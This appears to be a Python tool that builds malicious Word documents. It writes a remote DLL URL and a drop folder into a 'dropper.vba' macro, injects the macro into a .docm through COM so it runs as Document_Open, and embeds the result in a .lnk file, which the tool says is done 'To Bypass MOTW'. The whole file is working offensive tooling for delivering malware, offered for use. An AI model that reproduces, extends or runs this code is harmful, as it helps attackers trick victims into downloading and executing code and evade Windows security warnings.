import os
import sys
import re
import zipfile
import subprocess
import time
import shutil
import textwrap
import win32com.client
from termcolor import colored
from prompt_toolkit import prompt
from prompt_toolkit.completion import PathCompleter
from prompt_toolkit.formatted_text import HTML


def display_helper():
    print(colored("\n[+] Shortcuts:\n", 'green'))
    print(colored("%AllUsersProfile%\t\t:\tC:\\ProgramData", 'red'))
    print(colored("%AppData%\t\t\t:\tC:\\Users\\{username}\\AppData\\Roaming", 'red'))
    print(colored("%CommonProgramFiles%\t\t:\tC:\\Program Files\\Common Files", 'red'))
    print(colored("%CommonProgramFiles(x86)%\t:\tC:\\Program Files (x86)\\Common Files", 'red'))
    print(colored("%HomeDrive%\t\t\t:\tC:\\", 'red'))
    print(colored("%LocalAppData%\t\t\t:\tC:\\Users\\{username}\\AppData\\Local", 'red'))
    print(colored("%ProgramData%\t\t\t:\tC:\\ProgramData", 'red'))
    print(colored("%ProgramFiles%\t\t\t:\tC:\\Program Files or C:\\Program Files (x86)", 'red'))
    print(colored("%ProgramFiles(x86)%\t\t:\tC:\\Program Files (x86)", 'red'))
    print(colored("%Public%\t\t\t:\tC:\\Users\\Public", 'red'))
    print(colored("%SystemDrive%\t\t\t:\tC:", 'red'))
    print(colored("%SystemRoot%\t\t\t:\tC:\\Windows", 'red'))
    print(colored("%Temp%\t\t\t\t:\tC:\\Users\\{Username}\\AppData\\Local\\Temp", 'red'))
    print(colored("%UserProfile%\t\t\t:\tC:\\Users\\{username}", 'red'))




def inject_macro_word(docm_file, output_file, macro_code):
    # Make a copy of the original file
    shutil.copy(docm_file, output_file)

    # Replace Auto_Open with Document_Open in the macro code
    macro_code = macro_code.replace("Auto_Open", "Document_Open")

    # Initialize Word COM object
    Word = win32com.client.Dispatch('Word.Application')
    Word.Visible = False  # Word does not need to be visible for macro injection
    Word.DisplayAlerts = False

    try:
        # Open the copied document
        doc = Word.Documents.Open(os.path.abspath(output_file))

        # Get the ThisDocument module for macro
        wdmodule = doc.VBProject.VBComponents("ThisDocument")

        # Set macro code
        wdmodule.CodeModule.AddFromString(macro_code)

        # Print the macro code to verify it's correct
        # print(f"Injected the following macro code:\n{macro_code}")

    finally:
        # Save and close the document
        doc.Save()
        doc.Close(SaveChanges=0) # No need to save changes here, we have just done it above.
        Word.Quit()

        # Wait for Word to close
        time.sleep(1)

        # Release COM objects
        del wdmodule
        del doc
        del Word



def update_vba_file_url_droppingPath(new_url, new_folder_path, vba_file_name):
    # If the new_folder_path contains "\" replace it with "\\"
    if "\\" in new_folder_path:
        new_folder_path = new_folder_path.replace("\\", "\\\\")

    # If the new_folder_path contains double quotes, remove them
    new_folder_path = new_folder_path.strip('\"')

    # Read in the VBA script
    with open(vba_file_name, "r") as file:
        vba_script = file.read()

    # Replace URL in script using regex
    updated_script = re.sub(r'(URL = ").*?(")', rf'\1{new_url}\2', vba_script)

    # Replace folder path in script using regex
    updated_script = re.sub(r'(folderPath = ").*?(")', rf'\1{new_folder_path}\2', updated_script)

    # Write updated script back to file
    with open(vba_file_name, "w") as file:
        file.write(updated_script)


def execute_embed_docm(docm_file, lnk_file):
    # If the lnk file already exists, delete it
    if os.path.exists(lnk_file):
        os.remove(lnk_file)

    # Execute EmbedXLSM.exe with the provided xlsm and lnk files
    subprocess.call([".\\tools\\DocLnk.exe", docm_file, lnk_file])



def genMalDoc():
    url = input(colored("\n\n[?] Enter the URL of the DLL:\n\n ", 'red') + colored("[*] Answer >  ", 'green'))
    display_helper()
    droppingPath = input(colored("\n\n[?] Enter Target Directory to Drop the DLL to:\n\n ", 'red') + colored("[*] Answer >  ", 'green'))

    text_file = "notes.txt"
    text_data = "This is some arbitrary data."
    macro_file = "dropper.vba"
    update_vba_file_url_droppingPath(url, droppingPath, macro_file)

    docm_file = prompt(HTML('<ansired>\n[+] Enter the .docm file path: </ansired>'), completer=PathCompleter())
    output_file = prompt(HTML('<ansired>\n[+] Enter the output .docm file path: </ansired>'), completer=PathCompleter())
    lnk_file = prompt(HTML('<ansired>\n[+] Enter the output .lnk file path: </ansired>'), completer=PathCompleter())
    
            
    with open(macro_file, 'r') as f:
        macro_code = f.read()

    print(colored('\n\n[+] Reading ' + docm_file + ' File.', 'red'))
    print()

    print(colored('[+] Injecting ' + macro_file + ' into ' + docm_file + ' and generating malicious ' + output_file + ' Document.', 'red'))
    print()

    time.sleep(1)  # Delay to give the system time to close the file

    inject_macro_word(docm_file, output_file, macro_code)

    print(colored('[+] Embed ' + output_file + ' within the generated ' + lnk_file + ' To Bypass MOTW.', 'red'))
    print()

    execute_embed_docm(output_file, lnk_file)

